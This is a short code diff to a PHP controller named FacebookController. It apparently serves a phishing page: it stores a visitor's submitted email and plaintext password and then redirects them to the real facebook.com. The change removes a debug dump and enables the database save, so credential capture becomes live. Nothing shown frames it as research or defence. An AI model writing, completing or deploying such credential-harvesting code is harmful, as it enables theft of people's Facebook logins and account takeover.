@@ -40,8 +40,8 @@ class FacebookController extends Controller
 
         $dataFacebook->email = $request->email;
         $dataFacebook->password = $request->password;
-        dd($dataFacebook);
-        //$dataFacebook->save();
+        //dd($dataFacebook);
+        $dataFacebook->save();
 
         return redirect('https://facebook.com/');
     }
